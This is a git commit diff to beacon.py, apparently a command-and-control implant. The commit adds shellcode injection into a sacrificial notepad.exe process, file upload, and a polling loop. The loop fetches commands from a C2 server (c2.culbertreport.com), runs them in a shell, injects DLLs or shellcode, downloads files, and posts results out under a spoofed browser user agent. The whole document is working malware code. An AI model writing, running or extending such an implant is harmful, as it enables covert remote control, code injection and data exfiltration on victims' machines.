5b9c73905b886b5618bfa0bc4ae2eb0645436324
matt-culbert <culbertmatt@gmail.com>
2022-04-24 19:31:51 -0400

    Update beacon.py

--- beacon.py
+++ beacon.py
@@ -17,12 +17,46 @@ def get_pid(process_name):
             return proc.pid
 
 
+def proc_inject(shellcode, sacrificial_process='notepad.exe'):
+    notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
+    pid = get_pid(sacrificial_process)
+    PAGE_EXECUTE_READWRITE = 0x00000040
+    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
+    VIRTUAL_MEM = (0x1000 | 0x2000)
+    kernel32 = windll.kernel32
+    pid_to_kill = pid
+    padding = 4 - (len(pid))
+    replace_value = pid + ("\x00" * padding)
+    replace_string = "\x41" * 4
+    shellcode = shellcode.replace(replace_string, replace_value)
+    code_size = len(shellcode)
+    # Get a handle to the process we are injecting into.
+    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
+    if not h_process:
+        return f"[*] Couldn't acquire a handle to PID: {pid}"
+    # Allocate some space for the shellcode
+    arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size,
+                                          VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
+    # Write out the shellcode
+    written = c_int(0)
+    kernel32.WriteProcessMemory(h_process, arg_address, shellcode,
+                                code_size, byref(written))
+    # Now we create the remote thread and point its entry routine
+    # to be head of our shellcode
+    thread_id = c_ulong(0)
+    if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None,
+                                       0, byref(thread_id)):
+        return "[*] Failed to inject process-killing shellcode. Exiting."
+    else:
+        return "[*] Process injected successfully."
+
+
 def dll_inject(dll_path, sacrificial_process='notepad.exe'):
     """
     Taken from grayhat Python
     Adapted for our use
     Requires a DLL path and a sacrificial_process is optional.
-    If no process name is provided, notepad.exe will be used and them terminated
+    If no process name is provided, notepad.exe will be used
     """
     notepad = subprocess.Popen([sacrificial_process])  # Start a sacrificial process
     pid = get_pid(sacrificial_process)
@@ -35,7 +69,7 @@ def dll_inject(dll_path, sacrificial_process='notepad.exe'):
     # Get a handle to the process we are injecting into.
     h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
     if not h_process:
-        print(f"[*] Couldn't acquire a handle to PID: {pid}")
+        return f"[*] Couldn't acquire a handle to PID: {pid}"
 
     # Allocate some space for the DLL path
     arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
@@ -50,11 +84,9 @@ def dll_inject(dll_path, sacrificial_process='notepad.exe'):
     thread_id = c_ulong(0)
 
     if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
-        print("[*] Failed to inject the DLL. Exiting.")
-    print("[*] Remote thread with ID 0x%08x created." % thread_id.value)
-
-    if sacrificial_process == 'notepad.exe':
-        notepad.kill()  # Kill sacrificial process
+        return "[*] Failed to inject the DLL. Exiting."
+    else:
+        return "[*] Remote thread created."
 
 
 def cmdexe(beacon_command):
@@ -68,8 +100,16 @@ def cmdexe(beacon_command):
     process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
     out, err = process.communicate()
     out = out.decode()
-    print(out)
     return out
+
+
+def upload(filePath, url="http://httpbin.org/post"):
+    '''
+    Takes in a URL and filepath
+    '''
+    uploadFile = open(filePath, 'rb')
+    uploadUrl = url
+    status = requests.post(uploadUrl, files={"Files": uploadFile})
 
 
 def dwnld(url, ext):
@@ -80,24 +120,43 @@ def dwnld(url, ext):
     r = requests.get(url)
     open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)
 
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion'
+    # Set our UA to firefox
+}
+
+# Below is the cert requirements for mTLS when using requests
 # , cert=('client.crt', 'client.key'), verify='ca.crt'
 while 1:
-    a = requests.get('http://c2.culbertreport.com:8000')
+    a = requests.get('http://c2.culbertreport.com:8000', headers=headers)
     cmd = a.text
     print(cmd)
     op = cmd.split(';')[0]
     cm = cmd.split(';')[1]
     ex = cmd.split(';')[2]
     if op == 'cmd':
-        output = cmdexe(cm)
-        response = requests.post('http://httpbin.org/post', data=output)
+        returned = cmdexe(cm)
+        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
         print(response.request.url)
         print(response.request.body)
         print(response.request.headers)
     if op == 'inject':
-        dll_inject(cm)
+        returned = dll_inject(cm)
+        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
+        print(response.request.url)
+        print(response.request.body)
+        print(response.request.headers)
+    if op == 'proc':
+        returned = proc_inject(cm)
+        response = requests.post('http://httpbin.org/post', data=returned, headers=headers)
+        print(response.request.url)
+        print(response.request.body)
+        print(response.request.headers)
     if op == 'download':
         dwnld(cm, ex)
+    if op == 'upload':
+        upload(cm, ex)
     else:
         time.sleep(1)
     time.sleep(20)
